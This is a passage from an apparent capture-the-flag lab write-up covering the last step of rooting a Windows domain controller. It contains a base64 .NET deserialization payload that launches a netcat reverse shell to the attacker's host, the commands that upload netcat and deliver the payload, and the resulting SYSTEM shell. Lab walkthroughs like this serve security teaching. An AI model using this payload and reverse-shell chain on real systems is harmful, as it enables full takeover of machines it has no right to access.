JvY2Vzc1N0YXJ0SW5mbyBBcmd1bWVudHM9Ii9jIEM6XFVzZXJzXE1pc2NzdmNcbmM2NC5leGUgLWUgY21kIDEwLjEwLjE0LjggODg4OCIgU3RhbmRhcmRFcnJvckVuY29kaW5nPSJ7eDpOdWxsfSIgU3RhbmRhcmRPdXRwdXRFbmNvZGluZz0ie3g6TnVsbH0iIFVzZXJOYW1lPSIiIFBhc3N3b3JkPSJ7eDpOdWxsfSIgRG9tYWluPSIiIExvYWRVc2VyUHJvZmlsZT0iRmFsc2UiIEZpbGVOYW1lPSJjbWQiIC8+DQogICAgICA8L3NkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgIDwvc2Q6UHJvY2Vzcz4NCiAgPC9PYmplY3REYXRhUHJvdmlkZXIuT2JqZWN0SW5zdGFuY2U+DQo8L09iamVjdERhdGFQcm92aWRlcj4LCw==
```

We can then move back to our linux device, and upload a netcat binary to the device so we can get an easy reverse shell back:
``` shell
evil-winrm -i dc1.scrm.local -r scrm.local
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\miscsvc\Documents> cd ..
*Evil-WinRM* PS C:\Users\miscsvc> upload nc64.exe
```

We then send the  payload through nc:
``` shell
nc $TARGETIP 4411

UPLOAD_ORDER;AAEAAAD/////AQAAAAAAAAAMAgAAAFdTeXN0ZW0uV2luZG93cy5Gb3JtcywgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAACFTeXN0ZW0uV2luZG93cy5Gb3Jtcy5BeEhvc3QrU3RhdGUBAAAAEVByb3BlcnR5QmFnQmluYXJ5BwICAAAACQMAAAAPAwAAAL0DAAACAAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAA3wU8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtMTYiPz4NCjxPYmplY3REYXRhUHJvdmlkZXIgTWV0aG9kTmFtZT0iU3RhcnQiIElzSW5pdGlhbExvYWRFbmFibGVkPSJGYWxzZSIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIgeG1sbnM6c2Q9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PVN5c3RlbSIgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiPg0KICA8T2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KICAgIDxzZDpQcm9jZXNzPg0KICAgICAgPHNkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgICAgICA8c2Q6UHJvY2Vzc1N0YXJ0SW5mbyBBcmd1bWVudHM9Ii9jIEM6XFVzZXJzXE1pc2NzdmNcbmM2NC5leGUgLWUgY21kIDEwLjEwLjE0LjggODg4OCIgU3RhbmRhcmRFcnJvckVuY29kaW5nPSJ7eDpOdWxsfSIgU3RhbmRhcmRPdXRwdXRFbmNvZGluZz0ie3g6TnVsbH0iIFVzZXJOYW1lPSIiIFBhc3N3b3JkPSJ7eDpOdWxsfSIgRG9tYWluPSIiIExvYWRVc2VyUHJvZmlsZT0iRmFsc2UiIEZpbGVOYW1lPSJjbWQiIC8+DQogICAgICA8L3NkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgIDwvc2Q6UHJvY2Vzcz4NCiAgPC9PYmplY3REYXRhUHJvdmlkZXIuT2JqZWN0SW5zdGFuY2U+DQo8L09iamVjdERhdGFQcm92aWRlcj4LCw==
ERROR_GENERAL;Error deserializing sales order: Unable to cast object of type 'State' to type 'ScrambleLib.SalesOrder'.
```

We will make sure we have a listener up and running before sending the payload:
``` shell
nc -lvnp 8888
```

Once we send the payload, we get a shell as NT AUTHORITY:
``` shell
nc -lvnp 8888    
listening on [any] 8888 ...
connect to [10.10.14.8] from (UNKNOWN) [10.129.11.10] 57445
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

```

We can now retrieve the **root.txt**:
``` shell
C:\Users\administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 5805-B4B6

 Directory of C:\Users\administrator\Desktop

29/05/2022  21:02    <DIR>          .
29/05/2022  21:02    <DIR>          ..
31/03/2026  02:36                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)  15,816,568,832 bytes free
```